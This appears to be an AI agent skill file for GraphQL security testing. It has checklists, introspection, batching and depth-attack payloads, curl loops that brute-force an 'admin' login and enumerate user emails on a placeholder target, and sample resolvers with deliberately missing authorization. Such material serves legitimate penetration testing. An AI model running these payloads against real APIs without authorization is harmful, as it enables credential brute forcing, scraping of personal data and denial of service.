---
name: hunt-graphql
description: GraphQL hunting — Introspection, batching attacks, depth attacks. Use when testing for GraphQL vulnerabilities, when user mentions API security, or when analyzing GraphQL endpoints. Includes authorization bypass and information disclosure.
---

# 🎯 GraphQL Hunting Skill

Elite-level GraphQL vulnerability detection and exploitation.

## Detection Checklist

### Introspection
- [ ] Test introspection query
- [ ] Map all types and fields
- [ ] Identify hidden queries/mutations
- [ ] Check for disabled introspection

### Authorization
- [ ] Test query authorization bypass
- [ ] Test mutation authorization bypass
- [ ] Test field-level authorization
- [ ] Test nested query authorization

### Information Disclosure
- [ ] Test error message leakage
- [ ] Test debug information exposure
- [ ] Test batch query information

## Payloads

### Introspection
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name }
        }
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

### Batching Attack
```graphql
[
  { "query": "mutation { login(username: \"admin\", password: \"password1\") { token } }" },
  { "query": "mutation { login(username: \"admin\", password: \"password2\") { token } }" },
  { "query": "mutation { login(username: \"admin\", password: \"password3\") { token } }" }
]
```

### Depth Attack
```graphql
{
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      posts {
                        comments {
                          author {
                            id
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Batch Query
```graphql
{
  user(id: 1) { email }
  user(id: 2) { email }
  user(id: 3) { email }
  user(id: 4) { email }
  user(id: 5) { email }
}
```

## Testing Methodology

1. **Map GraphQL endpoint** — /graphql, /api/graphql, /v1/graphql
2. **Test introspection** — if disabled, try alternative techniques
3. **Enumerate queries/mutations** — understand the API surface
4. **Test authorization** — can you access data you shouldn't?
5. **Test batching** — can you bypass rate limiting?
6. **Test depth** — can you cause DoS via deep queries?
7. **Test error handling** — do errors leak information?

## Tools
- `InQL` — Burp extension for GraphQL testing
- `GraphiQL` — GraphQL IDE
- `Altair` — GraphQL client
- `graphql-path-enum` — Path enumeration

## Common Vulnerable Patterns
```javascript
// Missing authorization
const resolvers = {
  Query: {
    user: (_, { id }) => db.users.findById(id)  // No auth check
  }
}

// Information leakage in errors
throw new Error(`User ${id} not found in table ${tableName}`)

// No rate limiting on mutations
const resolvers = {
  Mutation: {
    login: (_, { username, password }) => authenticate(username, password)
  }
}
```

## Impact Escalation
```bash
# Enumerate all users
for i in $(seq 1 1000); do
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ user(id: $i) { email name } }\"}"
done

# Brute force login via batching
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation { login(username: \"admin\", password: \"pass1\") { token } }"},{"query":"mutation { login(username: \"admin\", password: \"pass2\") { token } }"}]'

# Extract schema
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
```
